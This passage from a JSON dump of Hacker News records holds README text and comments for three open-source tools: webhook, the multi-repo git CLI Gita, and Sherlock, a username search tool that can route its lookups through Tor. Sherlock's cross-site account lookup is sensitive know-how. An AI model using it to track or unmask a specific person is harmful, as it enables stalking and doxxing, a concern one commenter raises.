        "id": "802e5107-aa4b-4ed2-80e6-4752bd9278de",
        "url_text": "What is webhook? webhook is a lightweight configurable tool written in Go, that allows you to easily create HTTP endpoints (hooks) on your server, which you can use to execute configured commands. You can also pass data from the HTTP request (such as headers, payload or query variables) to your commands. webhook also allows you to specify rules which have to be satisfied in order for the hook to be triggered. For example, if you're using Github or Bitbucket, you can use webhook to set up a hook that runs a redeploy script for your project on your staging server, whenever you push changes to the master branch of your project. If you use Mattermost or Slack, you can set up an \"Outgoing webhook integration\" or \"Slash command\" to run various commands on your server, which can then report back directly to you or your channels using the \"Incoming webhook integrations\", or the appropriate response body. webhook aims to do nothing more than it should do, and that is: receive the request, parse the headers, payload and query variables, check if the specified rules for the hook are satisfied, and finally, pass the specified arguments to the specified command via command line arguments or via environment variables. Everything else is the responsibility of the command's author. Hookdoo If you don't have time to waste configuring, hosting, debugging and maintaining your webhook instance, we offer a SaaS solution that has all of the capabilities webhook provides, plus a lot more, and all that packaged in a nice friendly web interface. If you are interested, find out more at hookdoo website. If you have any questions, you can contact us at info@hookdoo.com If you need a way of inspecting, monitoring and replaying webhooks without the back and forth troubleshooting, give Hookdeck a try! Getting started Installation Building from source To get started, first make sure you've properly set up your Go 1.14 or newer environment and then run $ go build github.com/adnanh/webhook to build the latest version of the webhook. Using package manager Snap store Ubuntu If you are using Ubuntu linux (17.04 or later), you can install webhook using sudo apt-get install webhook which will install community packaged version. Debian If you are using Debian linux (\"stretch\" or later), you can install webhook using sudo apt-get install webhook which will install community packaged version (thanks @freeekanayaka) from https://packages.debian.org/sid/webhook Download prebuilt binaries Prebuilt binaries for different architectures are available at GitHub Releases. Configuration Next step is to define some hooks you want webhook to serve. webhook supports JSON or YAML configuration files, but we'll focus primarily on JSON in the following example. Begin by creating an empty file named hooks.json. This file will contain an array of hooks the webhook will serve. Check Hook definition page to see the detailed description of what properties a hook can contain, and how to use them. Let's define a simple hook named redeploy-webhook that will run a redeploy script located in /var/scripts/redeploy.sh. Make sure that your bash script has #!/bin/sh shebang on top. Our hooks.json file will now look like this: [ { \"id\": \"redeploy-webhook\", \"execute-command\": \"/var/scripts/redeploy.sh\", \"command-working-directory\": \"/var/webhook\" } ] NOTE: If you prefer YAML, the equivalent hooks.yaml file would be: - id: redeploy-webhook execute-command: \"/var/scripts/redeploy.sh\" command-working-directory: \"/var/webhook\" You can now run webhook using $ /path/to/webhook -hooks hooks.json -verbose It will start up on default port 9000 and will provide you with one HTTP endpoint http://yourserver:9000/hooks/redeploy-webhook Check webhook parameters page to see how to override the ip, port and other settings such as hook hotreload, verbose output, etc, when starting the webhook. By performing a simple HTTP GET or POST request to that endpoint, your specified redeploy script would be executed. Neat! However, hook defined like that could pose a security threat to your system, because anyone who knows your endpoint, can send a request and execute your command. To prevent that, you can use the \"trigger-rule\" property for your hook, to specify the exact circumstances under which the hook would be triggered. For example, you can use them to add a secret that you must supply as a parameter in order to successfully trigger the hook. Please check out the Hook rules page for detailed list of available rules and their usage. Multipart Form Data webhook provides limited support the parsing of multipart form data. Multipart form data can contain two types of parts: values and files. All form values are automatically added to the payload scope. Use the parse-parameters-as-json settings to parse a given value as JSON. All files are ignored unless they match one of the following criteria: The Content-Type header is application/json. The part is named in the parse-parameters-as-json setting. In either case, the given file part will be parsed as JSON and added to the payload map. Templates webhook can parse the hooks configuration file as a Go template when given the -template CLI parameter. See the Templates page for more details on template usage. Using HTTPS webhook by default serves hooks using http. If you want webhook to serve secure content using https, you can use the -secure flag while starting webhook. Files containing a certificate and matching private key for the server must be provided using the -cert /path/to/cert.pem and -key /path/to/key.pem flags. If the certificate is signed by a certificate authority, the cert file should be the concatenation of the server's certificate followed by the CA's certificate. TLS version and cipher suite selection flags are available from the command line. To list available cipher suites, use the -list-cipher-suites flag. The -tls-min-version flag can be used with -list-cipher-suites. CORS Headers If you want to set CORS headers, you can use the -header name=value flag while starting webhook to set the appropriate CORS headers that will be returned with each response. Interested in running webhook inside of a Docker container? You can use one of the following Docker images, or create your own (please read this discussion): almir/webhook roxedus/webhook thecatlady/webhook Examples Check out Hook examples page for more complex examples of hooks. Guides featuring webhook Plex 2 Telegram by @psyhomb Webhook & JIRA by @perfecto25 Trigger Ansible AWX job runs on SCM (e.g. git) commit by @jpmens Deploy using GitHub webhooks by @awea Setting up Automatic Deployment and Builds Using Webhooks by Will Browning Auto deploy your Node.js app on push to GitHub in 3 simple steps by Karolis Rusenas Automate Static Site Deployments with Salt, Git, and Webhooks by Linode Using Prometheus to Automatically Scale WebLogic Clusters on Kubernetes by Marina Kogan Github Pages and Jekyll - A New Platform for LACNIC Labs by Carlos Martnez Cagnazzo How to Deploy React Apps Using Webhooks and Integrating Slack on Ubuntu by Arslan Ud Din Shafiq Private webhooks by Thomas Adventures in webhooks by Drake GitHub pro tips by Spencer Lyon XiaoMi Vacuum + Amazon Button = Dash Cleaning by c0mmensal Set up Automated Deployments From Github With Webhook by Maxim Orlov VIDEO: Gitlab CI/CD configuration using Docker and adnanh/webhook to deploy on VPS - Tutorial #1 by Yes! Let's Learn Software Engineering Integrate automatic deployment in 20 minutes using webhooks + Nginx setup by Anksus ... Want to add your own? Open an Issue or create a PR :-) Community Contributions See the webhook-contrib repository for a collections of tools and helpers related to webhook that have been contributed by the webhook community. Need help? Check out existing issues to see if someone else also had the same problem, or open a new one. Support active development Sponsors DigitalOcean is a simple and robust cloud computing platform, designed for developers. BrowserStack is a cloud-based cross-browser testing tool that enables developers to test their websites across various browsers on different operating systems and mobile devices, without requiring users to install virtual machines, devices or emulators. Support this project by becoming a sponsor. Your logo will show up here with a link to your website. By contributing This project exists thanks to all the people who contribute. Contribute!. By giving money OpenCollective Backer OpenCollective Sponsor PayPal Patreon Faircode Flattr Thank you to all our backers! License The MIT License (MIT) Copyright (c) 2015 Adnan Hajdarevic adnanh@gmail.com Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. ",
        "_version_": 1718527438234845184
      },
      {
        "story_id": [19074170],
        "story_author": ["nosarthur"],
        "story_descendants": [36],
        "story_score": [79],
        "story_time": ["2019-02-04T05:22:20Z"],
        "story_title": "Show HN: Gita – a CLI tool to manage multiple Git repos",
        "search": [
          "Show HN: Gita – a CLI tool to manage multiple Git repos",
          "https://github.com/nosarthur/gita",
          "_______________________________ ( ____ \\__ __|__ __( ___ ) | ( \\/ ) ( ) ( | ( ) | | | | | | | | (___) | | | ____ | | | | | ___ | | | \\_ ) | | | | | ( ) | | (___) |__) (___ | | | ) ( | (_______)_______/ )_( |/ \\| v0.15 Gita: a command-line tool to manage multiple git repos This tool does two things display the status of multiple git repos such as branch, modification, commit message side by side (batch) delegate git commands/aliases from any working directory If several repos are related, it helps to see their status together. I also hate to change directories to execute git commands. In this screenshot, the gita ll command displays the status of all repos. The gita remote dotfiles command translates to git remote -v for the dotfiles repo, even though we are not in the repo. The gita fetch command fetches from all repos and two of them have updates. To see the pre-defined commands, run gita -h or take a look at cmds.json. To add your own commands, see the customization section. To run arbitrary git command, see the superman mode section. To run arbitrary shell command, see the shell mode section. The branch color distinguishes 5 situations between local and remote branches: color meaning white local has no remote green local is the same as remote red local has diverged from remote purple local is ahead of remote (good for push) yellow local is behind remote (good for merge) The choice of purple for ahead and yellow for behind is motivated by blueshift and redshift, using green as baseline. You can change the color scheme using the gita color command. See the customization section. The additional status symbols denote symbol meaning + staged changes * unstaged changes _ untracked files/folders The bookkeeping sub-commands are gita add <repo-path(s)> [-g <groupname>]: add repo(s) to gita, optionally into an existing group gita add -a <repo-parent-path(s)>: add repo(s) in <repo-parent-path(s)> recursively and automatically generate hierarchical groups. See the customization section for more details. gita add -b <bare-repo-path(s)>: add bare repo(s) to gita. See the customization section for more details on setting custom worktree. gita add -r <repo-parent-path(s)>: add repo(s) in <repo-parent-path(s)> recursively gita clone <config-file>: clone repos in config-file (generated by gita freeze) to current directory. gita clone -p <config-file>: clone repos in config-file to prescribed paths. gita context: context sub-command gita context: show current context gita context <group-name>: set context to group-name, all operations then only apply to repos in this group gita context auto: set context automatically according to the current working directory gita context none: remove context gita color: color sub-command gita color [ll]: Show available colors and the current coloring scheme gita color reset: Reset to the default coloring scheme gita color set <situation> <color>: Use the specified color for the local-remote situation gita flags: flags sub-command gita flags set <repo-name> <flags>: add custom flags to repo gita flags [ll]: display repos with custom flags gita freeze: print information of all repos such as URL, name, and path. Use with gita clone. gita group: group sub-command gita group add <repo-name(s)> -n <group-name>: add repo(s) to a new or existing group gita group [ll]: display existing groups with repos gita group ls: display existing group names gita group rename <group-name> <new-name>: change group name gita group rm <group-name(s)>: delete group(s) gita group rmrepo <repo-name(s)> -n <group-name>: remove repo(s) from existing group gita info: info sub-command gita info [ll]: display the used and unused information items gita info add <info-item>: enable information item gita info rm <info-item>: disable information item gita ll: display the status of all repos gita ll <group-name>: display the status of repos in a group gita ll -g: display the repo summaries by groups gita ls: display the names of all repos gita ls <repo-name>: display the absolute path of one repo gita rename <repo-name> <new-name>: rename a repo gita rm <repo-name(s)>: remove repo(s) from gita (won't remove files on disk) gita -v: display gita version The git delegating sub-commands are of two formats gita <sub-command> [repo-name(s) or group-name(s)]: optional repo or group input, and no input means all repos. gita <sub-command> <repo-name(s) or groups-name(s)>: required repo name(s) or group name(s) input They translate to git <sub-command> for the corresponding repos. By default, only fetch and pull take optional input. In other words, gita fetch and gita pull apply to all repos. To see the pre-defined sub-commands, run gita -h or take a look at cmds.json. To add your own sub-commands or override the default behaviors, see the customization section. To run arbitrary git command, see the superman mode section. If more than one repos are specified, the git command runs asynchronously, with the exception of log, difftool and mergetool, which require non-trivial user input. Repo configuration is saved in $XDG_CONFIG_HOME/gita/repos.csv (most likely ~/.config/gita/repos.csv). Installation To install the latest version, run If you prefer development mode, download the source code and run pip3 install -e <gita-source-folder> In either case, calling gita in terminal may not work, then put the following line in the .bashrc file. alias gita=\"python3 -m gita\" Windows users may need to enable the ANSI escape sequence in terminal for the branch color to work. See this stackoverflow post for details. Auto-completion Download .gita-completion.bash or .gita-completion.zsh and source it in shell. Superman mode The superman mode delegates any git command or alias. Usage: gita super [repo-name(s) or group-name(s)] <any-git-command-with-or-without-options> Here repo-name(s) or group-name(s) are optional, and their absence means all repos. For example, gita super checkout master puts all repos on the master branch gita super frontend-repo backend-repo commit -am 'implement a new feature' executes git commit -am 'implement a new feature' for frontend-repo and backend-repo Shell mode The shell mode delegates any shell command. Usage: gita shell [repo-name(s) or group-name(s)] <any-shell-command> Here repo-name(s) or group-name(s) are optional, and their absence means all repos. For example, gita shell ll lists contents for all repos gita shell repo1 repo2 mkdir docs create a new directory docs in repo1 and repo2 gita shell \"git describe --abbrev=0 --tags | xargs git checkout\": check out the latest tag for all repos Customization define repo group and context When the project contains several independent but related repos, we can define a group and execute gita command on this group. For example, gita group add repo1 repo2 -n my-group gita ll my-group gita pull my-group To save more typing, one can set a group as context, then any gita command is scoped to the group gita context my-group gita ll gita pull The most useful context maybe auto. In this mode, the context is automatically determined from the current working directory (CWD): the context is the group whose member repo's path contains CWD. To set it, run To remove the context, run It is also possible to recursively add repos within a directory and generate hierarchical groups automatically. For example, running on the following folder structure src project1 repo1 repo2 repo3 project2 repo4 repo5 repo6 gives rise to 3 groups: src:repo1,repo2,repo3,repo4,repo5,repo6 src-project1:repo1,repo2 src-project2:repo4,repo5 add user-defined sub-command using json file Custom delegating sub-commands can be defined in $XDG_CONFIG_HOME/gita/cmds.json (most likely ~/.config/gita/cmds.json) And they shadow the default ones if name collisions exist. Default delegating sub-commands are defined in cmds.json. For example, gita stat <repo-name(s)> is registered as \"stat\":{ \"cmd\": \"git diff --stat\", \"help\": \"show edit statistics\" } which executes git diff --stat for the specified repo(s). To disable asynchronous execution, set disable_async to be true. See the difftool example: \"difftool\":{ \"cmd\": \"git difftool\", \"disable_async\": true, \"help\": \"show differences using a tool\" } If you want a custom command to behave like gita fetch, i.e., to apply to all repos when no repo is specified, set allow_all to be true. For example, the following snippet creates a new command gita comaster [repo-name(s)] with optional repo name input. \"comaster\":{ \"cmd\": \"checkout master\", \"allow_all\": true, \"help\": \"checkout the master branch\" } Any command that runs in the superman mode mode or the shell mode can be defined in this json format. For example, the following command runs in shell mode and fetches only the current branch from upstream. \"fetchcrt\":{ \"cmd\": \"git rev-parse --abbrev-ref HEAD | xargs git fetch --prune upstream\", \"allow_all\": true, \"shell\": true, \"help\": \"fetch current branch only\" } customize the local/remote relationship coloring displayed by the gita ll command You can see the default color scheme and the available colors via gita color. To change the color coding, use gita color set <situation> <color>. The configuration is saved in $XDG_CONFIG_HOME/gita/color.csv. customize information displayed by the gita ll command You can customize the information displayed by gita ll. The used and unused information items are shown with gita info, and the configuration is saved in $XDG_CONFIG_HOME/gita/info.csv. For example, the default setting corresponds to branch,commit_msg,commit_time customize git command flags One can set custom flags to run git commands. For example, with gita flags set my-repo --git-dir=`gita ls dotfiles` --work-tree=$HOME any git command/alias triggered from gita on dotfiles will use these flags. Note that the flags are applied immediately after git. For example, gita st dotfiles translates to git --git-dir=$HOME/somefolder --work-tree=$HOME status running from the dotfiles directory. This feature was originally added to deal with bare repo dotfiles. Requirements Gita requires Python 3.6 or higher, due to the use of f-string and asyncio module. Under the hood, gita uses subprocess to run git commands/aliases. Thus the installed git version may matter. I have git 1.8.3.1, 2.17.2, and 2.20.1 on my machines, and their results agree. Tips effect shell command enter <repo> directory cd `gita ls <repo>` delete repos in <group> gita group ll <group> | xargs gita rm Contributing To contribute, you can report/fix bugs request/implement features star/recommend this project Read this article if you have never contribute code to open source project before. Chat room is available on To run tests locally, simply pytest in the source code folder. Note that context should be set as none. More implementation details are in design.md. A step-by-step guide to reproduce this project is here. You can also sponsor me on GitHub. Any amount is appreciated! Other multi-repo tools I haven't tried them but I heard good things about them. myrepos repo ",
          "One thing this project does really well is to start the readme with a screenshot. I open the link, scroll down to the readme, and I immediately see what sort of user interface/experience I will get. Some commenters have noted that Gita is similar to other multi-repo tools, but both Repo and wstool are more effort to evaluate, because their readmes don't have pictures.",
          "Nice, but is there a way to just run any command? I.e. just `gita <optional repo names/paths> <pass entire command line git -C repodir>`. This has advantages in that you don't have to go round via a command file, don't have to keep it synced across machines, don't have to remember what you put in the file etc, and can just use the git syntax which already took long enough to learn by heart :P<p>I've used multiple multiple repository tools and in the end all I happen to use is one (usually versioned) file to store a list of repositories and then a command which just loops over all repos and applies anything to it. If I need custom commands I use git aliases so that works both for normal git and whatever tool used."
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/nosarthur/gita",
        "comments.comment_id": [19075272, 19075476],
        "comments.comment_author": ["fyhn", "stinos"],
        "comments.comment_descendants": [1, 3],
        "comments.comment_time": [
          "2019-02-04T10:43:55Z",
          "2019-02-04T11:34:37Z"
        ],
        "comments.comment_text": [
          "One thing this project does really well is to start the readme with a screenshot. I open the link, scroll down to the readme, and I immediately see what sort of user interface/experience I will get. Some commenters have noted that Gita is similar to other multi-repo tools, but both Repo and wstool are more effort to evaluate, because their readmes don't have pictures.",
          "Nice, but is there a way to just run any command? I.e. just `gita <optional repo names/paths> <pass entire command line git -C repodir>`. This has advantages in that you don't have to go round via a command file, don't have to keep it synced across machines, don't have to remember what you put in the file etc, and can just use the git syntax which already took long enough to learn by heart :P<p>I've used multiple multiple repository tools and in the end all I happen to use is one (usually versioned) file to store a list of repositories and then a command which just loops over all repos and applies anything to it. If I need custom commands I use git aliases so that works both for normal git and whatever tool used."
        ],
        "id": "5712b0a0-77d9-47a6-b5b9-35fa62185a10",
        "url_text": "_______________________________ ( ____ \\__ __|__ __( ___ ) | ( \\/ ) ( ) ( | ( ) | | | | | | | | (___) | | | ____ | | | | | ___ | | | \\_ ) | | | | | ( ) | | (___) |__) (___ | | | ) ( | (_______)_______/ )_( |/ \\| v0.15 Gita: a command-line tool to manage multiple git repos This tool does two things display the status of multiple git repos such as branch, modification, commit message side by side (batch) delegate git commands/aliases from any working directory If several repos are related, it helps to see their status together. I also hate to change directories to execute git commands. In this screenshot, the gita ll command displays the status of all repos. The gita remote dotfiles command translates to git remote -v for the dotfiles repo, even though we are not in the repo. The gita fetch command fetches from all repos and two of them have updates. To see the pre-defined commands, run gita -h or take a look at cmds.json. To add your own commands, see the customization section. To run arbitrary git command, see the superman mode section. To run arbitrary shell command, see the shell mode section. The branch color distinguishes 5 situations between local and remote branches: color meaning white local has no remote green local is the same as remote red local has diverged from remote purple local is ahead of remote (good for push) yellow local is behind remote (good for merge) The choice of purple for ahead and yellow for behind is motivated by blueshift and redshift, using green as baseline. You can change the color scheme using the gita color command. See the customization section. The additional status symbols denote symbol meaning + staged changes * unstaged changes _ untracked files/folders The bookkeeping sub-commands are gita add <repo-path(s)> [-g <groupname>]: add repo(s) to gita, optionally into an existing group gita add -a <repo-parent-path(s)>: add repo(s) in <repo-parent-path(s)> recursively and automatically generate hierarchical groups. See the customization section for more details. gita add -b <bare-repo-path(s)>: add bare repo(s) to gita. See the customization section for more details on setting custom worktree. gita add -r <repo-parent-path(s)>: add repo(s) in <repo-parent-path(s)> recursively gita clone <config-file>: clone repos in config-file (generated by gita freeze) to current directory. gita clone -p <config-file>: clone repos in config-file to prescribed paths. gita context: context sub-command gita context: show current context gita context <group-name>: set context to group-name, all operations then only apply to repos in this group gita context auto: set context automatically according to the current working directory gita context none: remove context gita color: color sub-command gita color [ll]: Show available colors and the current coloring scheme gita color reset: Reset to the default coloring scheme gita color set <situation> <color>: Use the specified color for the local-remote situation gita flags: flags sub-command gita flags set <repo-name> <flags>: add custom flags to repo gita flags [ll]: display repos with custom flags gita freeze: print information of all repos such as URL, name, and path. Use with gita clone. gita group: group sub-command gita group add <repo-name(s)> -n <group-name>: add repo(s) to a new or existing group gita group [ll]: display existing groups with repos gita group ls: display existing group names gita group rename <group-name> <new-name>: change group name gita group rm <group-name(s)>: delete group(s) gita group rmrepo <repo-name(s)> -n <group-name>: remove repo(s) from existing group gita info: info sub-command gita info [ll]: display the used and unused information items gita info add <info-item>: enable information item gita info rm <info-item>: disable information item gita ll: display the status of all repos gita ll <group-name>: display the status of repos in a group gita ll -g: display the repo summaries by groups gita ls: display the names of all repos gita ls <repo-name>: display the absolute path of one repo gita rename <repo-name> <new-name>: rename a repo gita rm <repo-name(s)>: remove repo(s) from gita (won't remove files on disk) gita -v: display gita version The git delegating sub-commands are of two formats gita <sub-command> [repo-name(s) or group-name(s)]: optional repo or group input, and no input means all repos. gita <sub-command> <repo-name(s) or groups-name(s)>: required repo name(s) or group name(s) input They translate to git <sub-command> for the corresponding repos. By default, only fetch and pull take optional input. In other words, gita fetch and gita pull apply to all repos. To see the pre-defined sub-commands, run gita -h or take a look at cmds.json. To add your own sub-commands or override the default behaviors, see the customization section. To run arbitrary git command, see the superman mode section. If more than one repos are specified, the git command runs asynchronously, with the exception of log, difftool and mergetool, which require non-trivial user input. Repo configuration is saved in $XDG_CONFIG_HOME/gita/repos.csv (most likely ~/.config/gita/repos.csv). Installation To install the latest version, run If you prefer development mode, download the source code and run pip3 install -e <gita-source-folder> In either case, calling gita in terminal may not work, then put the following line in the .bashrc file. alias gita=\"python3 -m gita\" Windows users may need to enable the ANSI escape sequence in terminal for the branch color to work. See this stackoverflow post for details. Auto-completion Download .gita-completion.bash or .gita-completion.zsh and source it in shell. Superman mode The superman mode delegates any git command or alias. Usage: gita super [repo-name(s) or group-name(s)] <any-git-command-with-or-without-options> Here repo-name(s) or group-name(s) are optional, and their absence means all repos. For example, gita super checkout master puts all repos on the master branch gita super frontend-repo backend-repo commit -am 'implement a new feature' executes git commit -am 'implement a new feature' for frontend-repo and backend-repo Shell mode The shell mode delegates any shell command. Usage: gita shell [repo-name(s) or group-name(s)] <any-shell-command> Here repo-name(s) or group-name(s) are optional, and their absence means all repos. For example, gita shell ll lists contents for all repos gita shell repo1 repo2 mkdir docs create a new directory docs in repo1 and repo2 gita shell \"git describe --abbrev=0 --tags | xargs git checkout\": check out the latest tag for all repos Customization define repo group and context When the project contains several independent but related repos, we can define a group and execute gita command on this group. For example, gita group add repo1 repo2 -n my-group gita ll my-group gita pull my-group To save more typing, one can set a group as context, then any gita command is scoped to the group gita context my-group gita ll gita pull The most useful context maybe auto. In this mode, the context is automatically determined from the current working directory (CWD): the context is the group whose member repo's path contains CWD. To set it, run To remove the context, run It is also possible to recursively add repos within a directory and generate hierarchical groups automatically. For example, running on the following folder structure src project1 repo1 repo2 repo3 project2 repo4 repo5 repo6 gives rise to 3 groups: src:repo1,repo2,repo3,repo4,repo5,repo6 src-project1:repo1,repo2 src-project2:repo4,repo5 add user-defined sub-command using json file Custom delegating sub-commands can be defined in $XDG_CONFIG_HOME/gita/cmds.json (most likely ~/.config/gita/cmds.json) And they shadow the default ones if name collisions exist. Default delegating sub-commands are defined in cmds.json. For example, gita stat <repo-name(s)> is registered as \"stat\":{ \"cmd\": \"git diff --stat\", \"help\": \"show edit statistics\" } which executes git diff --stat for the specified repo(s). To disable asynchronous execution, set disable_async to be true. See the difftool example: \"difftool\":{ \"cmd\": \"git difftool\", \"disable_async\": true, \"help\": \"show differences using a tool\" } If you want a custom command to behave like gita fetch, i.e., to apply to all repos when no repo is specified, set allow_all to be true. For example, the following snippet creates a new command gita comaster [repo-name(s)] with optional repo name input. \"comaster\":{ \"cmd\": \"checkout master\", \"allow_all\": true, \"help\": \"checkout the master branch\" } Any command that runs in the superman mode mode or the shell mode can be defined in this json format. For example, the following command runs in shell mode and fetches only the current branch from upstream. \"fetchcrt\":{ \"cmd\": \"git rev-parse --abbrev-ref HEAD | xargs git fetch --prune upstream\", \"allow_all\": true, \"shell\": true, \"help\": \"fetch current branch only\" } customize the local/remote relationship coloring displayed by the gita ll command You can see the default color scheme and the available colors via gita color. To change the color coding, use gita color set <situation> <color>. The configuration is saved in $XDG_CONFIG_HOME/gita/color.csv. customize information displayed by the gita ll command You can customize the information displayed by gita ll. The used and unused information items are shown with gita info, and the configuration is saved in $XDG_CONFIG_HOME/gita/info.csv. For example, the default setting corresponds to branch,commit_msg,commit_time customize git command flags One can set custom flags to run git commands. For example, with gita flags set my-repo --git-dir=`gita ls dotfiles` --work-tree=$HOME any git command/alias triggered from gita on dotfiles will use these flags. Note that the flags are applied immediately after git. For example, gita st dotfiles translates to git --git-dir=$HOME/somefolder --work-tree=$HOME status running from the dotfiles directory. This feature was originally added to deal with bare repo dotfiles. Requirements Gita requires Python 3.6 or higher, due to the use of f-string and asyncio module. Under the hood, gita uses subprocess to run git commands/aliases. Thus the installed git version may matter. I have git 1.8.3.1, 2.17.2, and 2.20.1 on my machines, and their results agree. Tips effect shell command enter <repo> directory cd `gita ls <repo>` delete repos in <group> gita group ll <group> | xargs gita rm Contributing To contribute, you can report/fix bugs request/implement features star/recommend this project Read this article if you have never contribute code to open source project before. Chat room is available on To run tests locally, simply pytest in the source code folder. Note that context should be set as none. More implementation details are in design.md. A step-by-step guide to reproduce this project is here. You can also sponsor me on GitHub. Any amount is appreciated! Other multi-repo tools I haven't tried them but I heard good things about them. myrepos repo ",
        "_version_": 1718527384810946561
      },
      {
        "story_id": [21671843],
        "story_author": ["Sn0wlizz4rd"],
        "story_descendants": [83],
        "story_score": [172],
        "story_time": ["2019-11-30T19:53:00Z"],
        "story_title": "Sherlock: Find usernames across social networks",
        "search": [
          "Sherlock: Find usernames across social networks",
          "https://github.com/sherlock-project/sherlock",
          "Hunt down social media accounts by username across social networks Installation | Usage | Docker Notes | Contributing Installation # clone the repo $ git clone https://github.com/sherlock-project/sherlock.git # change the working directory to sherlock $ cd sherlock # install the requirements $ python3 -m pip install -r requirements.txt Usage $ python3 sherlock --help usage: sherlock [-h] [--version] [--verbose] [--folderoutput FOLDEROUTPUT] [--output OUTPUT] [--tor] [--unique-tor] [--csv] [--site SITE_NAME] [--proxy PROXY_URL] [--json JSON_FILE] [--timeout TIMEOUT] [--print-all] [--print-found] [--no-color] [--browse] [--local] USERNAMES [USERNAMES ...] Sherlock: Find Usernames Across Social Networks (Version 0.14.0) positional arguments: USERNAMES One or more usernames to check with social networks. optional arguments: -h, --help show this help message and exit --version Display version information and dependencies. --verbose, -v, -d, --debug Display extra debugging information and metrics. --folderoutput FOLDEROUTPUT, -fo FOLDEROUTPUT If using multiple usernames, the output of the results will be saved to this folder. --output OUTPUT, -o OUTPUT If using single username, the output of the result will be saved to this file. --tor, -t Make requests over Tor; increases runtime; requires Tor to be installed and in system path. --unique-tor, -u Make requests over Tor with new Tor circuit after each request; increases runtime; requires Tor to be installed and in system path. --csv Create Comma-Separated Values (CSV) File. --site SITE_NAME Limit analysis to just the listed sites. Add multiple options to specify more than one site. --proxy PROXY_URL, -p PROXY_URL Make requests over a proxy. e.g. socks5://127.0.0.1:1080 --json JSON_FILE, -j JSON_FILE Load data from a JSON file or an online, valid, JSON file. --timeout TIMEOUT Time (in seconds) to wait for response to requests. Default timeout is infinity. A longer timeout will be more likely to get results from slow sites. On the other hand, this may cause a long delay to gather all results. --print-all Output sites where the username was not found. --print-found Output sites where the username was found. --no-color Don't color terminal output --browse, -b Browse to all results on default browser. --local, -l Force the use of the local data.json file. To search for only one user: To search for more than one user: python3 sherlock user1 user2 user3 Accounts found will be stored in an individual text file with the corresponding username (e.g user123.txt). Anaconda (Windows) Notes If you are using Anaconda in Windows, using 'python3' might not work. Use 'python' instead. Docker Notes If docker is installed you can build an image and run this as a container. docker build -t mysherlock-image . Once the image is built, sherlock can be invoked by running the following: docker run --rm -t mysherlock-image user123 The optional --rm flag removes the container filesystem on completion to prevent cruft build-up. See: https://docs.docker.com/engine/reference/run/#clean-up---rm The optional -t flag allocates a pseudo-TTY which allows colored output. See: https://docs.docker.com/engine/reference/run/#foreground Use the following command to access the saved results: docker run --rm -t -v \"$PWD/results:/opt/sherlock/results\" mysherlock-image -o /opt/sherlock/results/text.txt user123 The -v \"$PWD/results:/opt/sherlock/results\" options tell docker to create (or use) the folder results in the present working directory and to mount it at /opt/sherlock/results on the docker container. The -o /opt/sherlock/results/text.txt option tells sherlock to output the result. Or you can use \"Docker Hub\" to run sherlock: docker run theyahya/sherlock user123 Using docker-compose You can use the docker-compose.yml file from the repository and use this command: docker-compose run sherlock -o /opt/sherlock/results/text.txt user123 Contributing We would love to have you help us with the development of Sherlock. Each and every contribution is greatly valued! Here are some things we would appreciate your help on: Addition of new site support Bringing back site support of sites that have been removed in the past due to false positives [1] Please look at the Wiki entry on adding new sites to understand the issues. Tests Thank you for contributing to Sherlock! Before creating a pull request with new development, please run the tests to ensure that everything is working great. It would also be a good idea to run the tests before starting development to distinguish problems between your environment and the Sherlock software. The following is an example of the command line to run all the tests for Sherlock. This invocation hides the progress text that Sherlock normally outputs, and instead shows the verbose output of the tests. $ cd sherlock/sherlock $ python3 -m unittest tests.all --verbose Note that we do currently have 100% test coverage. Unfortunately, some of the sites that Sherlock checks are not always reliable, so it is common to get response problems. Any problems in connection will show up as warnings in the tests instead of true errors. If some sites are failing due to connection problems (site is down, in maintenance, etc) you can exclude them from tests by creating a tests/.excluded_sites file with a list of sites to ignore (one site name per line). Stargazers over time License MIT Sherlock Project Original Creator - Siddharth Dushantha ",
          "<i>CODE_OF_CONDUCT.md</i><p><i>Examples of unacceptable behavior by participants include:</i><p><i>Publishing others' private information, such as a physical or electronic address, without explicit permission</i><p>How is this tool not a violation of its own CoC?",
          "I don't get this? It checks against a limited list of websites if a username is taken. So what? This is hardly doxxing or \"smart\". Simply a faster method than the manual way, except it doesn't exhaust all avenues of search."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/sherlock-project/sherlock",
        "comments.comment_id": [21672262, 21672990],
        "comments.comment_author": ["lsb", "comfymatrix"],
        "comments.comment_descendants": [6, 1],
        "comments.comment_time": [
          "2019-11-30T21:34:33Z",
          "2019-12-01T00:30:56Z"
        ],
        "comments.comment_text": [
          "<i>CODE_OF_CONDUCT.md</i><p><i>Examples of unacceptable behavior by participants include:</i><p><i>Publishing others' private information, such as a physical or electronic address, without explicit permission</i><p>How is this tool not a violation of its own CoC?",
          "I don't get this? It checks against a limited list of websites if a username is taken. So what? This is hardly doxxing or \"smart\". Simply a faster method than the manual way, except it doesn't exhaust all avenues of search."
        ],
        "id": "c821e4cb-689b-4985-ad7f-dd816b7818f4",
